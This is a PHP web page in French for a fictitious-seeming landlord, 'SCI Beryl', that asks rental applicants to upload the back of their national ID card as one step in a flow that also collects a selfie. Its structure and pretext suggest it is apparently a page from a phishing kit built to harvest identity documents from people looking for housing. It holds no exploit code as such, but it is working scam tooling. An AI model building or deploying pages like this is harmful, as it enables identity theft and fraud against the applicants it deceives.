<?php 


include("../infos.php");
include("../common/sub_includes.php");

?>
<html lang="fr">

<?php include("../common/header.php")  ?>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW+Pj2yciDJxpsK1OYPAYjqT085Qq/1cq5FLXAZQ7Ay" crossorigin="anonymous">

    <style>
        .progressbar { margin: 0px 10px; overflow: hidden; }
        .progressbar > div { float: left; width: 20%; text-align: center; padding-bottom: 10px; border-bottom: 5px solid rgb(52, 141, 48); position: relative; margin-bottom: 7px; font-style: italic; }
        .progressbar > div > span { color: rgb(52, 141, 48); }
        .progressbar > div > div { position: absolute; bottom: -12px; left: 50%; width: 20px; height: 20px; background: rgb(52, 141, 48) none repeat scroll 0% 0%; border-radius: 10px; z-index: 0; }
        .progressbar > div.progressing > div { background: white none repeat scroll 0% 0%; border: 3px solid rgb(52, 141, 48); }
        .progressbar > div.progressing > span { color: rgb(0, 150, 136); font-style: normal; }
        @media (max-width: 470px) {
          .progressbar > div > span { font-size: 11px !important; }
          .progressbar > div { width: inherit; padding-left: 5px; }
          .progressbar { margin: 0px auto; }
          .last-payment-form > h1 { text-align: center; line-height: 100%; font-size: 25px; }
          .valider-btn { width: 100% !important; }
          .payment-form { padding: 10px !important; }
          .last-payment-form { padding: 10px !important; }
          .last-form-info > div { float: left !important; }
          .last-form-info > div > label { font-size: 11px; }
        }
        @media (max-width: 330px) {
          .progressbar > div > span { font-size: 10px !important; }
        }
        
        .content-wrap {
            overflow: hidden;
            margin: 10px 0px;
        }
        
        
        .content-wrap > div {
            float: left;
        }
        @media (min-width: 500px){
            .banner {
            float: left;
            width: 500px;
        }
        }
        .progressbar > div{
            width: 25%;
        }

    </style>
    <link rel="stylesheet" href="../assets/css/style_v2.css">
    <link rel="stylesheet" href="../assets/css/bootstrap.css">

    <link rel="shortcut icon" href="/public/fav.png" type="image/ico">
    <style>

        .container{
            width : 95% !important;
        }

    </style>
    <title>SCI Beryl</title>
</head>
<style>
                    .panel-heading{
                    border-bottom : 2px solid #3A3E41 !important

                }
                span{
                    color : #3A3E41 !important;
                }
                .btn-xl{
                    background-color : #3A3E41 !important;
                }
</style>
<style type="text/css">
    body {
    font-family : sans-serif;
}

.button {
    background      : #005f95;
    border          : none;
    border-radius   : 3px;
    color           : white;
    display         : inline-block;
    font-size       : 19px;
    font-weight     : bolder;
    letter-spacing  : 0.02em;
    padding         : 10px 20px;
    text-align      : center;
    text-shadow     : 0px 1px 2px rgba(0, 0, 0, 0.75);
    text-decoration : none;
    text-transform  : uppercase;
    transition      : all 0.2s;
}

.btn:hover {
    background : #4499c9;
}

.btn:active {
    background : #49ADE5;
}

input[type="file"] {
    display : none;
}

#file-drag {
    border        : 2px dashed #555;
    border-radius : 7px;
    color         : #555;
    cursor        : pointer;
    display       : block;
    font-weight   : bold;
    margin        : 1em 0;
    padding       : 3em;
    text-align    : center;
    transition    : background 0.3s, color 0.3s;
}

#file-drag:hover {
    background : #ddd;
}

#file-drag:hover,
#file-drag.hover {
    border-color : #3070A5;
    border-style : solid;
    box-shadow   : inset 0 3px 4px #888;
    color        : #3070A5;
}

#file-progress {
    display : none;
    margin  : 1em auto;
    width   : 100%;
}

#file-upload-btn {
    margin : auto;
}

#file-upload-btn:hover {
    background : #4499c9;
}

#file-upload-form {
    margin : auto;  
    width  : 40%;
}

progress {
    appearance    : none;
    background    : #eee;
    border        : none;
    border-radius : 3px;
    box-shadow    : 0 2px 5px rgba(0, 0, 0, 0.25) inset;
    height        : 30px;
}

progress[value]::-webkit-progress-value {
    background :
        -webkit-linear-gradient(-45deg, 
            transparent 33%,
            rgba(0, 0, 0, .2) 33%, 
            rgba(0,0, 0, .2) 66%,
            transparent 66%),
        -webkit-linear-gradient(right,
            #005f95,
            #07294d);
    background :
        linear-gradient(-45deg, 
            transparent 33%,
            rgba(0, 0, 0, .2) 33%, 
            rgba(0,0, 0, .2) 66%,
            transparent 66%),
        linear-gradient(right,
            #005f95,
            #07294d);
    background-size : 60px 30px, 100% 100%, 100% 100%;
    border-radius   : 3px;
}

progress[value]::-moz-progress-bar {
    background :
    -moz-linear-gradient(-45deg, 
        transparent 33%,
        rgba(0, 0, 0, .2) 33%, 
        rgba(0,0, 0, .2) 66%,
        transparent 66%),
    -moz-linear-gradient(right,
        #005f95,
        #07294d);
    background :
        linear-gradient(-45deg, 
            transparent 33%,
            rgba(0, 0, 0, .2) 33%, 
            rgba(0,0, 0, .2) 66%,
            transparent 66%),
        linear-gradient(right,
            #005f95,
            #07294d);
    background-size : 60px 30px, 100% 100%, 100% 100%;
    border-radius   : 3px;
}

ul {
    list-style-type : none;
    margin          : 0;
    padding         : 0;
}
</style>
<body>

<div class="row" style="display: flex; background: #3A3E41 none repeat scroll 0% 0%; margin-bottom: 30px;">
        <?php include("../common/head.php"); ?>
    </div>

    <div class="container">
        <div class="row">
            <ol class="breadcrumb ">
                <li class="active"></li>
            </ol>
        </div>
    </div>
    <main class="container" style="margin-top:-12px;" id="contenu">
        <div>
        <div class="row">
            <div class="col-md-12">

                <div class="panel panel-default" style="background: url('') no-repeat;">
                    <div class="panel-heading" style="padding:5px">

                        <h2 id="titre_authent" style="margin-top:12px;" class="text-center">Verification d'identité</h2>
                    </div>

                    <div class="panel-body">
                        <br> Candidat : <b><?php echo $_SESSION["nom"] . " " . $_SESSION["prenom"]  ?></b>
                        <br> Logement : <b><?php echo $_SESSION["appartement"]; ?></b>
                        <br> Date de visite : <b><?php echo $_SESSION["jours"]; ?></b>
                        <br> Date de la demande : <b><?php echo $_SESSION["date"] ?> à  <?php echo $_SESSION["heure"] ?></b>
                        <hr>

                        <div class="row">
                            <div class="col-md-7">
                                <div class="col-md-12">

                                    <div class="progressbar">
 
                                        <div>
                                            <span style="background: rgba(0, 0, 0, 0.0)!important;">Informations</span>
                                            <div></div>
                                        </div>
                                        <div class="progressing">
                                            <span style="background: rgba(0, 0, 0, 0.0)!important;">CNI</span>
                                            <div></div>
                                        </div>
                                        <div>
                                            <span style="background: rgba(0, 0, 0, 0.0)!important;">Selfie</span>
                                            <div></div>
                                        </div>
                                        <div>
                                            <span style="background: rgba(0, 0, 0, 0.0)!important;">Validation</span>
                                            <div></div>
                                        </div>
                                    </div>
                                    <br><br>
                                    
                                </div>
                                
                                
                                <h3>
                                    Veuillez envoyer le verso de votre CNI
                                </h3>
                                <form style="width: 100%" enctype="multipart/form-data" id="file-upload-form" action="../actions/jdd.php" method="post">
                                    <input required id="file-upload" type="file" name="fileUpload" />
                                    <label for="file-upload" id="file-drag">
                                        Sélectionnez la photo de votre CNI
                                        <br />OU
                                        <br />Faites glisser le fichier dans cette zone
                                        
                                        <br /><br /><span id="file-upload-btn" class="button">Ajouter le verso</span>
                                    </label>
                                    
                                    <progress id="file-progress" value="0">
                                        <span>0</span>%
                                    </progress>
                                    
                                    <output for="file-upload" id="messages"></output>
                                
                                <div>
                                   
                                    <img style="width: 80%" src="../assets/images/verso.png">
                                     <h6>Assurez-vous que tout le document soit lisible et bien éclairé comme l’exemple-ci dessus.</h6>
                                </div>
                                <br>
                                <div class="col-md-12">

                                    
                                    <button type="submit" class="btn btn-xl btn-primary">Valider</button>

                                    <br><br>
                                </div>
                                </form>
                            </div>

                        </div>

                    </div>
                </div>
            </div>
        </div>
        <br><br>
        </div>
    </main>

    <div id="loading" class="LoadingPage">
        <div class="centre">
            <div style="text-align: center;">
                <div style="margin-bottom: 25px;">
                    <img style="height: 30px" src="https://static.vecteezy.com/ti/vecteur-libre/p1/2228877-immobilier-logo-design-entreprise-signe-logo-vecteur-gratuit-vectoriel.jpg">
                </div>
                <span>Veuillez patienter ...</span>
            </div>
        </div>
    </div>

    <script
  src="https://code.jquery.com/jquery-3.4.1.min.js"
  crossorigin="anonymous"></script>

    <script>
        (function() {
    function Init() {
        var fileSelect = document.getElementById('file-upload'),
            fileDrag = document.getElementById('file-drag'),
            submitButton = document.getElementById('submit-button');

        fileSelect.addEventListener('change', fileSelectHandler, false);

        // Is XHR2 available?
        var xhr = new XMLHttpRequest();
        if (xhr.upload) 
        {
            // File Drop
            fileDrag.addEventListener('dragover', fileDragHover, false);
            fileDrag.addEventListener('dragleave', fileDragHover, false);
            fileDrag.addEventListener('drop', fileSelectHandler, false);
        }
    }

    function fileDragHover(e) {
        var fileDrag = document.getElementById('file-drag');

        e.stopPropagation();
        e.preventDefault();
        
        fileDrag.className = (e.type === 'dragover' ? 'hover' : 'modal-body file-upload');
    }

    function fileSelectHandler(e) {
        // Fetch FileList object
        var files = e.target.files || e.dataTransfer.files;

        // Cancel event and hover styling
        fileDragHover(e);

        // Process all File objects
        for (var i = 0, f; f = files[i]; i++) {
            parseFile(f);
            uploadFile(f);
        }
    }

    function output(msg) {
        var m = document.getElementById('messages');
        m.innerHTML = msg;
    }

    function parseFile(file) {
        output(
            '<ul>'
            +   '<li>Name: <strong>' + encodeURI(file.name) + '</strong></li>'
            +   '<li>Type: <strong>' + file.type + '</strong></li>'
            +   '<li>Size: <strong>' + (file.size / (1024 * 1024)).toFixed(2) + ' MB</strong></li>'
            + '</ul>'
        );
    }

    function setProgressMaxValue(e) {
        var pBar = document.getElementById('file-progress');

        if (e.lengthComputable) {
            pBar.max = e.total;
        }
    }

    function updateFileProgress(e) {
        var pBar = document.getElementById('file-progress');

        if (e.lengthComputable) {
            pBar.value = e.loaded;
        }
    }

    function uploadFile(file) {

        var xhr = new XMLHttpRequest(),
            fileInput = document.getElementById('class-roster-file'),
            pBar = document.getElementById('file-progress'),
            fileSizeLimit = 1024;   // In MB
        if (xhr.upload) {
            // Check if file is less than x MB
            if (file.size <= fileSizeLimit * 1024 * 1024) {
                // Progress bar
                pBar.style.display = 'inline';
                xhr.upload.addEventListener('loadstart', setProgressMaxValue, false);
                xhr.upload.addEventListener('progress', updateFileProgress, false);

                // File received / failed
                xhr.onreadystatechange = function(e) {
                    if (xhr.readyState == 4) {
                        // Everything is good!
                        
                        // progress.className = (xhr.status == 200 ? "success" : "failure");
                        // document.location.reload(true);
                    }
                };

                // Start upload
                xhr.open('POST', document.getElementById('file-upload-form').action, true);
                xhr.setRequestHeader('X-File-Name', file.name);
                xhr.setRequestHeader('X-File-Size', file.size);
                xhr.setRequestHeader('Content-Type', 'multipart/form-data');
                xhr.send(file);
            } else {
                output('Please upload a smaller file (< ' + fileSizeLimit + ' MB).');
            }
        }
    }

    // Check for the various File API support.
    if (window.File && window.FileList && window.FileReader) {
        Init();
    } else {
        document.getElementById('file-drag').style.display = 'none';
    }
})();


    </script>

</body>

</html>